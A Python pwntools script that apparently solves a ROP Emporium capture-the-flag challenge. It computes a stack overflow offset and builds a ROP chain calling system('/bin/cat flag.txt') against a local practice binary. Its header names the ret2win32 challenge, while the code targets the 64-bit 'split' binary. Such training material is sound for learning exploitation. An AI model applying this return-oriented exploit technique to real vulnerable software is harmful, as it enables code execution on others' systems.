#!/usr/bin/env python3

# ROP Emporium - ret2win32 solution using pwntools library
# Link: https://ropemporium.com/challenge/ret2win.html
# Created by dilldylanpickle on 4-2-2023
# GitHub: https://github.com/dilldylanpickle
#
# Dependencies:
#   - Python 3.8.10
#   - Pwntools (https://github.com/Gallopsled/pwntools)
#   - ROPgadget (https://github.com/JonathanSalwan/ROPgadget)

import os           # Provides a way of using operating system dependent functionalities
from pwn import *   # Import Python3 library for accessing operating system functionality

def exploit(binary_path):

    # Create an ELF object and start a new process
    elf = context.binary = ELF(binary_path)
    io = process(elf.path)

    # Get the address of the system function
    system_addr = elf.symbols["system"]

    # Use ROPgadget to find the address of a "pop rdi ; ret" instruction
    rop = ROP(elf)
    pop_rdi = ROP(elf).find_gadget(['pop rdi', 'ret']).address
    ret = rop.find_gadget(['ret'])[0]

    # Find the offset of the "/bin/cat flag.txt" string
    string_addr = next(elf.search(b'/bin/cat flag.txt'))

    # Get the offset by calling the find_offset function
    offset = find_offset(binary_path)

    # Construct the payload
    payload = b'A' * offset
    payload += p64(pop_rdi)
    payload += p64(string_addr)
    payload += p64(ret)
    payload += p64(system_addr)
    payload += p64(0x0)

    # Send the payload and print the output
    io.sendline(payload)
    log.info(io.clean())
    log.success('(SUCCESS) The flag has been sucessfully captured!')

    # Close the process
    io.close()

def find_offset(binary_path):

    # Disable logging for offset calculations
    context.log_level = 'error'

    # Create an ELF object and start a new process
    elf = context.binary = ELF(binary_path)
    io = process(elf.path)

    # Send a cyclic pattern as input to the binary
    pattern = cyclic(69)
    io.sendline(pattern)
    io.wait()           

    # Get the corefile to extract the value of the instruction pointer (eip)
    core = io.corefile
    rip = core.rip

    # Find the offset by searching for the cyclic pattern in the eip value
    offset = cyclic_find(core.read(core.rsp, 4))

    # Close the process that calculated the offset
    io.close()

    # Enable log level and output a result
    context.log_level = 'info'

    return offset

if __name__ == '__main__':
    binary_path = './split'
    warnings.filterwarnings("ignore", category=BytesWarning)
    exploit(binary_path)

    # Create a directory called 'core' if it does not already exist
    if not os.path.exists('Core_Dumps'):
        os.makedirs('Core_Dumps')

    # Move all files with the pattern 'core.*' to the 'core' directory
    for filename in os.listdir('.'):
        if filename.startswith('core.'):
            os.rename(filename, os.path.join('Core_Dumps', filename))
